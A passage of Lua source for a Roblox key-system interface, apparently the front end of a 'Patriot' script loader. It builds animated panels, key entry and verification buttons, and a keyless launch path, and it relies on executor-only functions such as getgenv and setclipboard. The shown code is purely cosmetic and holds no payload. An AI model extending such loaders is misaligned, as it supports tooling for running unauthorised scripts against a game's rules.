    clockDateLabel.Parent = clockContainer

    local clockRunning = true
    task.spawn(function()
        while clockRunning do
            if not clockTimeLabel or not clockTimeLabel.Parent then clockRunning = false break end
            clockTimeLabel.Text = formatTime12()
            clockDateLabel.Text = formatDate()
            task.wait(1)
        end
    end)
    panel.Destroying:Connect(function() clockRunning = false end)

    local function toggle(userIcon, container, baseWidth)
        isOpen = not isOpen
        if isOpen then
            TweenService:Create(panelStroke, TweenInfo.new(0.25), {Transparency = 0.3}):Play()
            TweenService:Create(panel, TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0, panelWidth, 0, panelHeight)}):Play()
            TweenService:Create(container, TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0, baseWidth + gap + panelWidth, 0, panelHeight)}):Play()
        else
            TweenService:Create(panelStroke, TweenInfo.new(0.2), {Transparency = 1}):Play()
            TweenService:Create(panel, TweenInfo.new(0.35, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, panelHeight)}):Play()
            TweenService:Create(container, TweenInfo.new(0.35, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, baseWidth, 0, panelHeight)}):Play()
        end
    end

    panelClose.MouseButton1Click:Connect(function() if isOpen then toggle(nil, parent, windowWidth) end end)
    return panel, toggle, function() return isOpen end, panelWidth
end

local function handleKeylessSkip()
    getgenv().SCRIPT_KEY = "KEYLESS"
    getgenv().PatriotLoaded = false
    Patriot:Notify("Access Granted", "Keyless access approved!", 3, "success")
    task.wait(0.3)
    if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end
end

local function BuildCenteredUI(windowWidth, windowHeight, panelHeight, userPanelWidth, changelogPanelWidth, gap, buildContent)
    local gui = buildContent.gui

    local container = Instance.new("Frame")
    container.Name = "Container"
    container.Size = UDim2.new(0, windowWidth, 0, panelHeight)
    container.Position = UDim2.new(0.5, 0, 1.5, 0)
    container.AnchorPoint = Vector2.new(0.5, 0.5)
    container.BackgroundTransparency = 1
    container.Parent = gui

    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, windowWidth, 0, windowHeight)
    mainFrame.Position = UDim2.new(0.5, 0, 0, 0)
    mainFrame.AnchorPoint = Vector2.new(0.5, 0)
    mainFrame.BackgroundColor3 = Patriot.Theme.Background
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = container
    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 6)

    local mainStroke = Instance.new("UIStroke", mainFrame)
    mainStroke.Color = Patriot.Theme.Accent
    mainStroke.Thickness = 1.5
    mainStroke.Transparency = 0.3

    local mainGradient = Instance.new("UIGradient", mainFrame)
    mainGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Patriot.Theme.Background),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 14, 16)),
        ColorSequenceKeypoint.new(1, Patriot.Theme.Background)
    })
    mainGradient.Rotation = 135

    spawnAmbientParticles(mainFrame, 15, nil)
    createScanLine(mainFrame, windowWidth, windowHeight)

    local userPanel, toggleUserPanel, isUserOpen, userPanelActualWidth = CreateUserInfoPanel(container, windowWidth, panelHeight, userPanelWidth, mainFrame, gap, false)
    local changelogPanel, toggleChangelog, isChangelogOpen, changelogPanelActualWidth = CreateChangelogPanel(container, windowWidth, panelHeight, changelogPanelWidth, mainFrame, gap)

    local function getContainerWidth()
        local w = windowWidth
        if isUserOpen() then w = w + gap + userPanelActualWidth end
        if isChangelogOpen() then w = w + gap + changelogPanelActualWidth end
        return w
    end

    local function toggleUser(userIcon)
        local currentW = getContainerWidth()
        if isUserOpen() then
            toggleUserPanel(userIcon, container, currentW - gap - userPanelActualWidth)
        else
            toggleUserPanel(userIcon, container, currentW)
        end
    end

    local function toggleCL(changelogIcon)
        local currentW = getContainerWidth()
        if isChangelogOpen() then
            toggleChangelog(changelogIcon, container, currentW - gap - changelogPanelActualWidth)
        else
            toggleChangelog(changelogIcon, container, currentW)
        end
    end

    local function closeAllPanels(userIcon, changelogIcon, callback)
        if isChangelogOpen() then toggleCL(changelogIcon) task.wait(0.4) end
        if isUserOpen() then toggleUser(userIcon) task.wait(0.4) end
        if callback then callback() end
    end

    return {
        container = container,
        mainFrame = mainFrame,
        mainStroke = mainStroke,
        toggleUser = toggleUser,
        toggleCL = toggleCL,
        isUserOpen = isUserOpen,
        isChangelogOpen = isChangelogOpen,
        closeAllPanels = closeAllPanels
    }
end

local function BuildKeylessUI()
    local oldGui = hui:FindFirstChild("PatriotKeylessSystem")
    if oldGui then oldGui:Destroy() end
    local oldGui2 = hui:FindFirstChild("PatriotKeySystem")
    if oldGui2 then oldGui2:Destroy() end

    enableBlur()

    local mobile = isMobile()
    local padding = 14
    local windowWidth = 300
    local windowHeight = 265
    local userPanelWidth = 165
    local changelogPanelWidth = 200
    local gap = 12

    local gui = Instance.new("ScreenGui")
    gui.Name = "PatriotKeylessSystem"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.Parent = hui

    local ui = BuildCenteredUI(windowWidth, windowHeight, windowHeight, userPanelWidth, changelogPanelWidth, gap, {gui = gui})
    local container = ui.container
    local main = ui.mainFrame
    local mainStroke = ui.mainStroke

    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, 50)
    header.BackgroundColor3 = Patriot.Theme.Header
    header.BorderSizePixel = 0
    header.Active = true
    header.Parent = main
    Instance.new("UICorner", header).CornerRadius = UDim.new(0, 6)

    local headerGradient = Instance.new("UIGradient", header)
    headerGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Patriot.Theme.Header),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(22, 22, 28))
    })

    local headerFix = Instance.new("Frame")
    headerFix.Size = UDim2.new(1, 0, 0, 8)
    headerFix.Position = UDim2.new(0, 0, 1, -8)
    headerFix.BackgroundColor3 = Patriot.Theme.Header
    headerFix.BorderSizePixel = 0
    headerFix.Parent = header

    local headerLine = Instance.new("Frame")
    headerLine.Size = UDim2.new(1, 0, 0, 1)
    headerLine.Position = UDim2.new(0, 0, 1, 0)
    headerLine.BackgroundColor3 = Patriot.Theme.Accent
    headerLine.BackgroundTransparency = 0.4
    headerLine.BorderSizePixel = 0
    headerLine.Parent = header

    local logo = Instance.new("ImageLabel")
    logo.Size = UDim2.new(0, 30, 0, 30)
    logo.Position = UDim2.new(0, padding, 0.5, 0)
    logo.AnchorPoint = Vector2.new(0, 0.5)
    logo.BackgroundTransparency = 1
    logo.Image = getLogoIcon()
    logo.ImageColor3 = Patriot.Theme.Text
    logo.ScaleType = Enum.ScaleType.Fit
    logo.Parent = header

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -90, 1, 0)
    title.Position = UDim2.new(0, padding + 40, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = Patriot.Appearance.Title
    title.TextColor3 = Patriot.Theme.Text
    title.TextSize = mobile and 24 or 26
    title.Font = Enum.Font.ArimoBold
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = header

    local closeBtn = Instance.new("ImageButton")
    closeBtn.Size = UDim2.new(0, 22, 0, 22)
    closeBtn.Position = UDim2.new(1, -padding, 0.5, 0)
    closeBtn.AnchorPoint = Vector2.new(1, 0.5)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Image = getIcon("close")
    closeBtn.ImageColor3 = Patriot.Theme.TextDim
    closeBtn.ScaleType = Enum.ScaleType.Fit
    closeBtn.Parent = header
    closeBtn.MouseEnter:Connect(function() TweenService:Create(closeBtn, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.Error}):Play() end)
    closeBtn.MouseLeave:Connect(function() TweenService:Create(closeBtn, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.TextDim}):Play() end)

    local contentY = 60

    local successBox = Instance.new("Frame")
    successBox.Size = UDim2.new(0.94, 0, 0, 52)
    successBox.Position = UDim2.new(0.5, 0, 0, contentY)
    successBox.AnchorPoint = Vector2.new(0.5, 0)
    successBox.BackgroundColor3 = Patriot.Theme.Success
    successBox.BackgroundTransparency = 0.88
    successBox.BorderSizePixel = 0
    successBox.Parent = main
    Instance.new("UICorner", successBox).CornerRadius = UDim.new(0, 6)

    local successStroke = Instance.new("UIStroke", successBox)
    successStroke.Color = Patriot.Theme.Success
    successStroke.Thickness = 1
    successStroke.Transparency = 0.4

    local successGradient = Instance.new("UIGradient", successBox)
    successGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 180, 95)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 150, 80))
    })
    successGradient.Rotation = 45

    local checkIcon = Instance.new("ImageLabel")
    checkIcon.Size = UDim2.new(0, 24, 0, 24)
    checkIcon.Position = UDim2.new(0, 16, 0.5, 0)
    checkIcon.AnchorPoint = Vector2.new(0, 0.5)
    checkIcon.BackgroundTransparency = 1
    checkIcon.Image = getIcon("check")
    checkIcon.ImageColor3 = Patriot.Theme.Success
    checkIcon.ScaleType = Enum.ScaleType.Fit
    checkIcon.Parent = successBox

    local successText = Instance.new("TextLabel")
    successText.Size = UDim2.new(1, -60, 1, 0)
    successText.Position = UDim2.new(0, 52, 0, 0)
    successText.BackgroundTransparency = 1
    successText.Text = "Access Granted"
    successText.TextColor3 = Patriot.Theme.Success
    successText.TextSize = mobile and 17 or 18
    successText.Font = Enum.Font.ArimoBold
    successText.TextXAlignment = Enum.TextXAlignment.Left
    successText.Parent = successBox

    local keylessText = Instance.new("TextLabel")
    keylessText.Size = UDim2.new(1, 0, 0, 20)
    keylessText.Position = UDim2.new(0.5, 0, 0, contentY + 60)
    keylessText.AnchorPoint = Vector2.new(0.5, 0)
    keylessText.BackgroundTransparency = 1
    keylessText.Text = "Keyless Script"
    keylessText.TextColor3 = Patriot.Theme.TextDim
    keylessText.TextSize = mobile and 14 or 15
    keylessText.Font = Enum.Font.ArimoBold
    keylessText.Parent = main

    local divider = Instance.new("Frame")
    divider.Size = UDim2.new(1, 0, 0, 1)
    divider.Position = UDim2.new(0, 0, 0, contentY + 88)
    divider.BackgroundColor3 = Patriot.Theme.Divider
    divider.BorderSizePixel = 0
    divider.Parent = main

    local launchBtn = Instance.new("TextButton")
    launchBtn.Size = UDim2.new(0.75, 0, 0, 42)
    launchBtn.Position = UDim2.new(0.5, 0, 0, contentY + 103)
    launchBtn.AnchorPoint = Vector2.new(0.5, 0)
    launchBtn.BackgroundColor3 = Patriot.Theme.Accent
    launchBtn.BorderSizePixel = 0
    launchBtn.Text = ""
    launchBtn.AutoButtonColor = false
    launchBtn.Parent = main
    Instance.new("UICorner", launchBtn).CornerRadius = UDim.new(0, 6)

    local launchStroke = Instance.new("UIStroke", launchBtn)
    launchStroke.Color = Patriot.Theme.AccentHover
    launchStroke.Thickness = 1
    launchStroke.Transparency = 0.4

    local launchGradient = Instance.new("UIGradient", launchBtn)
    launchGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Patriot.Theme.Accent),
        ColorSequenceKeypoint.new(1, Patriot.Theme.AccentHover)
    })
    launchGradient.Rotation = 90

    local launchContent = Instance.new("Frame")
    launchContent.Size = UDim2.new(1, 0, 1, 0)
    launchContent.BackgroundTransparency = 1
    launchContent.Parent = launchBtn

    local launchLayout = Instance.new("UIListLayout", launchContent)
    launchLayout.FillDirection = Enum.FillDirection.Horizontal
    launchLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    launchLayout.VerticalAlignment = Enum.VerticalAlignment.Center
    launchLayout.Padding = UDim.new(0, 8)

    local launchIcon = Instance.new("ImageLabel")
    launchIcon.Size = UDim2.new(0, 18, 0, 18)
    launchIcon.BackgroundTransparency = 1
    launchIcon.Image = getIcon("shield")
    launchIcon.ImageColor3 = Patriot.Theme.Text
    launchIcon.ScaleType = Enum.ScaleType.Fit
    launchIcon.LayoutOrder = 1
    launchIcon.Parent = launchContent

    local launchLabel = Instance.new("TextLabel")
    launchLabel.Size = UDim2.new(0, 0, 0, 18)
    launchLabel.AutomaticSize = Enum.AutomaticSize.X
    launchLabel.BackgroundTransparency = 1
    launchLabel.Text = "Launch Script"
    launchLabel.TextColor3 = Patriot.Theme.Text
    launchLabel.TextSize = mobile and 14 or 15
    launchLabel.Font = Enum.Font.ArimoBold
    launchLabel.LayoutOrder = 2
    launchLabel.Parent = launchContent

    launchBtn.MouseEnter:Connect(function()
        TweenService:Create(launchBtn, TweenInfo.new(0.2), {BackgroundColor3 = Patriot.Theme.AccentHover}):Play()
        TweenService:Create(launchStroke, TweenInfo.new(0.2), {Transparency = 0.2}):Play()
    end)
    launchBtn.MouseLeave:Connect(function()
        TweenService:Create(launchBtn, TweenInfo.new(0.2), {BackgroundColor3 = Patriot.Theme.Accent}):Play()
        TweenService:Create(launchStroke, TweenInfo.new(0.2), {Transparency = 0.4}):Play()
    end)

    local bottomY = contentY + 153

    local function createBottomButton(iconKey, xOffset)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 38, 0, 38)
        btn.Position = UDim2.new(0.5, xOffset, 0, bottomY)
        btn.AnchorPoint = Vector2.new(0.5, 0)
        btn.BackgroundColor3 = Patriot.Theme.Input
        btn.BorderSizePixel = 0
        btn.Text = ""
        btn.AutoButtonColor = false
        btn.Parent = main
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)

        local btnStroke = Instance.new("UIStroke", btn)
        btnStroke.Color = Patriot.Theme.Accent
        btnStroke.Thickness = 1
        btnStroke.Transparency = 0.8

        local icon = Instance.new("ImageLabel")
        icon.Size = UDim2.new(0, 18, 0, 18)
        icon.Position = UDim2.new(0.5, 0, 0.5, 0)
        icon.AnchorPoint = Vector2.new(0.5, 0.5)
        icon.BackgroundTransparency = 1
        icon.Image = getIcon(iconKey)
        icon.ImageColor3 = Patriot.Theme.TextDim
        icon.ScaleType = Enum.ScaleType.Fit
        icon.Parent = btn

        btn.MouseEnter:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Patriot.Theme.SecondaryBackground}):Play()
            TweenService:Create(btnStroke, TweenInfo.new(0.2), {Transparency = 0.4}):Play()
        end)
        btn.MouseLeave:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Patriot.Theme.Input}):Play()
            TweenService:Create(btnStroke, TweenInfo.new(0.2), {Transparency = 0.8}):Play()
        end)
        return btn, icon
    end

    local userBtn, userIcon = createBottomButton("user", -46)
    local discordBtn, discordIcon = createBottomButton("discord", 0)
    local changelogBtn, changelogIcon = createBottomButton("changelog", 46)

    local discordBtn = discordBtn
    local discordIcon = discordIcon
    discordIcon.ImageColor3 = Patriot.Theme.Discord
    discordBtn.MouseEnter:Connect(function()
        TweenService:Create(discordIcon, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.DiscordHover}):Play()
    end)
    discordBtn.MouseLeave:Connect(function()
        TweenService:Create(discordIcon, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.Discord}):Play()
    end)

    if #Patriot.Changelog == 0 then
        changelogBtn.Visible = false
        userBtn.Position = UDim2.new(0.5, -22, 0, bottomY)
        discordBtn.Position = UDim2.new(0.5, 22, 0, bottomY)
    end

    local doors = CreateDoorOverlay(main, windowWidth, windowHeight)

    userBtn.MouseButton1Click:Connect(function() ui.toggleUser(userIcon) end)
    changelogBtn.MouseButton1Click:Connect(function() ui.toggleCL(changelogIcon) end)

    local function closeDoorsThenExit(callback)
        ui.closeAllPanels(userIcon, changelogIcon, function()
            doors.close(function() task.wait(0.35) if callback then callback() end end)
        end)
    end

    closeBtn.MouseButton1Click:Connect(function()
        Patriot:Notify("Goodbye", "See you next time!", 2, "close")
        closeDoorsThenExit(function()
            fullCleanup()
            TweenService:Create(container, TweenInfo.new(0.5, Enum.EasingStyle.Quart), {Position = UDim2.new(0.5, 0, -0.5, 0)}):Play()
            TweenService:Create(main, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
            TweenService:Create(mainStroke, TweenInfo.new(0.4), {Transparency = 1}):Play()
            task.wait(0.5) gui:Destroy()
        end)
        if Patriot.Callbacks.OnClose then Patriot.Callbacks.OnClose() end
    end)

    launchBtn.MouseButton1Click:Connect(function()
        Patriot:Notify("Launching", "Script loaded successfully!", 2, "success")
        getgenv().SCRIPT_KEY = "KEYLESS"
        getgenv().PatriotLoaded = false
        closeDoorsThenExit(function()
            disableBlur()
            TweenService:Create(container, TweenInfo.new(0.5, Enum.EasingStyle.Quart), {Position = UDim2.new(0.5, 0, -0.5, 0)}):Play()
            TweenService:Create(main, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
            TweenService:Create(mainStroke, TweenInfo.new(0.4), {Transparency = 1}):Play()
            task.wait(0.5) gui:Destroy()
            if not Internal.IsJunkieMode and not Internal.IsWilkinsMode and Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end
        end)
    end)

    discordBtn.MouseButton1Click:Connect(function()
        if Patriot.Links.Discord ~= "" then
            Patriot:Notify("Discord", "Invite link copied!", 2, "discord")
            pcall(function() setclipboard(Patriot.Links.Discord) end)
        end
    end)

    setupDragging(header, container)
    TweenService:Create(container, TweenInfo.new(0.6, Enum.EasingStyle.Quart), {Position = UDim2.new(0.5, 0, 0.45, 0)}):Play()
    task.wait(0.7)
    doors.open(function()
        checkIcon.Size = UDim2.new(0, 0, 0, 0)
        TweenService:Create(checkIcon, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 24, 0, 24)}):Play()
        task.wait(0.25)
        ui.toggleUser(userIcon)
        if #Patriot.Changelog > 0 then task.wait(0.35) ui.toggleCL(changelogIcon) end
    end)
end

local function BuildKeyUI()
    local oldGui = hui:FindFirstChild("PatriotKeySystem")
    if oldGui then oldGui:Destroy() end
    local oldGui2 = hui:FindFirstChild("PatriotKeylessSystem")
    if oldGui2 then oldGui2:Destroy() end

    enableBlur()

    local mobile = isMobile()
    local scale = getScale()
    local padding = 14
    local showShop = isShopEnabled()
    local shopHeight = 52
    local shopDividerHeight = 1
    local shopExtra = showShop and (shopHeight + shopDividerHeight) or 0
    local baseWindowHeight = mobile and math.clamp(360 * scale, 320, 400) or 360
    local windowWidth = mobile and math.clamp(400 * scale, 320, 440) or 400
    local windowHeight = baseWindowHeight + shopExtra
    local elementHeight = mobile and math.clamp(56 * scale, 48, 62) or 56
    local buttonHeight = mobile and math.clamp(42 * scale, 38, 48) or 42
    local statusHeight = mobile and math.clamp(60 * scale, 52, 68) or 60    local userPanelWidth = 180
    local changelogPanelWidth = 220
    local gap = 12

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PatriotKeySystem"
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = hui

    local ui = BuildCenteredUI(windowWidth, windowHeight, baseWindowHeight, userPanelWidth, changelogPanelWidth, gap, {gui = screenGui})
    local container = ui.container
    local mainFrame = ui.mainFrame
    local mainStroke = ui.mainStroke

    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, 50)
    header.BackgroundColor3 = Patriot.Theme.Header
    header.BorderSizePixel = 0
    header.Active = true
    header.Parent = mainFrame
    Instance.new("UICorner", header).CornerRadius = UDim.new(0, 6)

    local headerGradient = Instance.new("UIGradient", header)
    headerGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Patriot.Theme.Header),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(22, 22, 28))
    })

    local headerFix = Instance.new("Frame")
    headerFix.Size = UDim2.new(1, 0, 0, 6)
    headerFix.Position = UDim2.new(0, 0, 1, -6)
    headerFix.BackgroundColor3 = Patriot.Theme.Header
    headerFix.BorderSizePixel = 0
    headerFix.Parent = header

    local headerLine = Instance.new("Frame")
    headerLine.Size = UDim2.new(1, 0, 0, 1)
    headerLine.Position = UDim2.new(0, 0, 1, 0)
    headerLine.BackgroundColor3 = Patriot.Theme.Accent
    headerLine.BackgroundTransparency = 0.4
    headerLine.BorderSizePixel = 0
    headerLine.Parent = header

    local logo = Instance.new("ImageLabel")
    logo.Size = Patriot.Appearance.IconSize
    logo.Position = UDim2.new(0, padding, 0.5, 0)
    logo.AnchorPoint = Vector2.new(0, 0.5)
    logo.BackgroundTransparency = 1
    logo.Image = getLogoIcon()
    logo.ImageColor3 = Patriot.Theme.Text
    logo.ScaleType = Enum.ScaleType.Fit
    logo.Parent = header

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -90, 1, 0)
    titleLabel.Position = UDim2.new(0, padding + Patriot.Appearance.IconSize.X.Offset + 10, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = Patriot.Appearance.Title
    titleLabel.TextColor3 = Patriot.Theme.Text
    titleLabel.TextSize = mobile and 24 or 26
    titleLabel.Font = Enum.Font.ArimoBold
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = header

    local closeBtn = Instance.new("ImageButton")
    closeBtn.Size = UDim2.new(0, 22, 0, 22)
    closeBtn.Position = UDim2.new(1, -padding, 0.5, 0)
    closeBtn.AnchorPoint = Vector2.new(1, 0.5)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Image = getIcon("close")
    closeBtn.ImageColor3 = Patriot.Theme.TextDim
    closeBtn.ScaleType = Enum.ScaleType.Fit
    closeBtn.Parent = header
    closeBtn.MouseEnter:Connect(function() TweenService:Create(closeBtn, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.Error}):Play() end)
    closeBtn.MouseLeave:Connect(function() TweenService:Create(closeBtn, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.TextDim}):Play() end)

    local contentStartY = 60

    local statusFrame = Instance.new("Frame")
    statusFrame.Size = UDim2.new(0.94, 0, 0, statusHeight)
    statusFrame.Position = UDim2.new(0.5, 0, 0, contentStartY)
    statusFrame.AnchorPoint = Vector2.new(0.5, 0)
    statusFrame.BackgroundColor3 = Patriot.Theme.Input
    statusFrame.BorderSizePixel = 0
    statusFrame.ClipsDescendants = true
    statusFrame.Parent = mainFrame
    Instance.new("UICorner", statusFrame).CornerRadius = UDim.new(0, 6)

    local statusStroke = Instance.new("UIStroke", statusFrame)
    statusStroke.Color = Patriot.Theme.Accent
    statusStroke.Thickness = 1
    statusStroke.Transparency = 0.7

    local statusGradient = Instance.new("UIGradient", statusFrame)
    statusGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Patriot.Theme.Input),
        ColorSequenceKeypoint.new(1, Patriot.Theme.SecondaryBackground)
    })

    local statusGlow = createGlowRing(statusFrame, statusHeight * 0.5, UDim2.new(0.1, 0, 0.5, 0), Patriot.Theme.Accent)

    local statusIcon = Instance.new("ImageLabel")
    statusIcon.Size = UDim2.new(0, 24, 0, 24)
    statusIcon.Position = UDim2.new(0, 16, 0.5, 0)
    statusIcon.AnchorPoint = Vector2.new(0, 0.5)
    statusIcon.BackgroundTransparency = 1
    statusIcon.Image = getIcon("lock")
    statusIcon.ImageColor3 = Patriot.Theme.StatusIdle
    statusIcon.ScaleType = Enum.ScaleType.Fit
    statusIcon.Parent = statusFrame

    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, -60, 1, 0)
    statusLabel.Position = UDim2.new(0, 52, 0, 0)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = Patriot.Appearance.Subtitle
    statusLabel.TextColor3 = Patriot.Theme.StatusIdle
    statusLabel.TextSize = mobile and 17 or 18
    statusLabel.Font = Enum.Font.ArimoBold
    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
    statusLabel.TextTruncate = Enum.TextTruncate.AtEnd
    statusLabel.Parent = statusFrame

    local inputStartY = contentStartY + statusHeight + 10

    local inputFrame = Instance.new("Frame")
    inputFrame.Size = UDim2.new(0.94, 0, 0, elementHeight)
    inputFrame.Position = UDim2.new(0.5, 0, 0, inputStartY)
    inputFrame.AnchorPoint = Vector2.new(0.5, 0)
    inputFrame.BackgroundColor3 = Patriot.Theme.Input
    inputFrame.BorderSizePixel = 0
    inputFrame.ClipsDescendants = true
    inputFrame.Parent = mainFrame
    Instance.new("UICorner", inputFrame).CornerRadius = UDim.new(0, 6)

    local inputStroke = Instance.new("UIStroke", inputFrame)
    inputStroke.Color = Patriot.Theme.Accent
    inputStroke.Thickness = 1
    inputStroke.Transparency = 0.6

    local textBox = Instance.new("TextBox")
    textBox.Size = UDim2.new(1, -24, 1, 0)
    textBox.Position = UDim2.new(0, 12, 0.5, 0)
    textBox.AnchorPoint = Vector2.new(0, 0.5)
    textBox.BackgroundTransparency = 1
    textBox.Text = ""
    textBox.TextColor3 = Patriot.Theme.Text
    textBox.PlaceholderText = "Enter your key..."
    textBox.PlaceholderColor3 = Patriot.Theme.TextDim
    textBox.TextSize = mobile and 17 or 18
    textBox.Font = Enum.Font.ArimoBold
    textBox.ClearTextOnFocus = false
    textBox.TextTruncate = Enum.TextTruncate.AtEnd
    textBox.TextXAlignment = Enum.TextXAlignment.Left
    textBox.Parent = inputFrame
    textBox.Focused:Connect(function()
        TweenService:Create(inputStroke, TweenInfo.new(0.2), {Transparency = 0.2}):Play()
        TweenService:Create(inputFrame, TweenInfo.new(0.2), {BackgroundColor3 = Patriot.Theme.SecondaryBackground}):Play()
    end)
    textBox.FocusLost:Connect(function()
        TweenService:Create(inputStroke, TweenInfo.new(0.2), {Transparency = 0.6}):Play()
        TweenService:Create(inputFrame, TweenInfo.new(0.2), {BackgroundColor3 = Patriot.Theme.Input}):Play()
    end)

    local dividerY = inputStartY + elementHeight + 12

    local dividerLine = Instance.new("Frame")
    dividerLine.Size = UDim2.new(1, 0, 0, 1)
    dividerLine.Position = UDim2.new(0, 0, 0, dividerY)
    dividerLine.BackgroundColor3 = Patriot.Theme.Divider
    dividerLine.BorderSizePixel = 0
    dividerLine.Parent = mainFrame

    local acquireStartY = dividerY + 15

    local function createButton(text, iconKey, isPrimary, yPos)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.75, 0, 0, buttonHeight)
        btn.Position = UDim2.new(0.5, 0, 0, yPos)
        btn.AnchorPoint = Vector2.new(0.5, 0)
        btn.BackgroundColor3 = isPrimary and Patriot.Theme.Accent or Patriot.Theme.Input
        btn.BorderSizePixel = 0
        btn.Text = ""
        btn.AutoButtonColor = false
        btn.Parent = mainFrame
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)

        local btnStroke = Instance.new("UIStroke", btn)
        btnStroke.Color = isPrimary and Patriot.Theme.AccentHover or Patriot.Theme.Accent
        btnStroke.Thickness = 1
        btnStroke.Transparency = isPrimary and 0.4 or 0.6

        if isPrimary then
            local btnGradient = Instance.new("UIGradient", btn)
            btnGradient.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, Patriot.Theme.Accent),
                ColorSequenceKeypoint.new(1, Patriot.Theme.AccentHover)
            })
            btnGradient.Rotation = 90
        end

        local content = Instance.new("Frame")
        content.Size = UDim2.new(1, 0, 1, 0)
        content.BackgroundTransparency = 1
        content.Parent = btn

        local layout = Instance.new("UIListLayout", content)
        layout.FillDirection = Enum.FillDirection.Horizontal
        layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
        layout.VerticalAlignment = Enum.VerticalAlignment.Center
        layout.Padding = UDim.new(0, 8)

        local iconImg = Instance.new("ImageLabel")
        iconImg.Size = UDim2.new(0, 18, 0, 18)
        iconImg.BackgroundTransparency = 1
        iconImg.Image = getIcon(iconKey)
        iconImg.ImageColor3 = Patriot.Theme.Text
        iconImg.ScaleType = Enum.ScaleType.Fit
        iconImg.LayoutOrder = 1
        iconImg.Parent = content

        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(0, 0, 0, 20)
        label.AutomaticSize = Enum.AutomaticSize.X
        label.BackgroundTransparency = 1
        label.Text = text
        label.TextColor3 = Patriot.Theme.Text
        label.TextSize = mobile and 14 or 15
        label.Font = Enum.Font.ArimoBold
        label.LayoutOrder = 2
        label.Parent = content

        local origColor = btn.BackgroundColor3
        local hoverColor = isPrimary and Patriot.Theme.AccentHover or Patriot.Theme.Accent
        btn.MouseEnter:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = hoverColor}):Play()
            TweenService:Create(btnStroke, TweenInfo.new(0.2), {Transparency = 0.2}):Play()
        end)
        btn.MouseLeave:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = origColor}):Play()
            TweenService:Create(btnStroke, TweenInfo.new(0.2), {Transparency = isPrimary and 0.4 or 0.6}):Play()
        end)
        return btn
    end

    local acquireBtn = createButton("Get Key", "user", false, acquireStartY)
    local redeemBtn = createButton("Verify Key", "shield", true, acquireStartY + buttonHeight + 5)
    local bottomY = acquireStartY + buttonHeight * 2 + 10

    local function createBottomButton(iconKey, xOffset)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 38, 0, 38)
        btn.Position = UDim2.new(0.5, xOffset, 0, bottomY)
        btn.AnchorPoint = Vector2.new(0.5, 0)
        btn.BackgroundColor3 = Patriot.Theme.Input
        btn.BorderSizePixel = 0
        btn.Text = ""
        btn.AutoButtonColor = false
        btn.Parent = mainFrame
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)

        local btnStroke = Instance.new("UIStroke", btn)
        btnStroke.Color = Patriot.Theme.Accent
        btnStroke.Thickness = 1
        btnStroke.Transparency = 0.8

        local icon = Instance.new("ImageLabel")
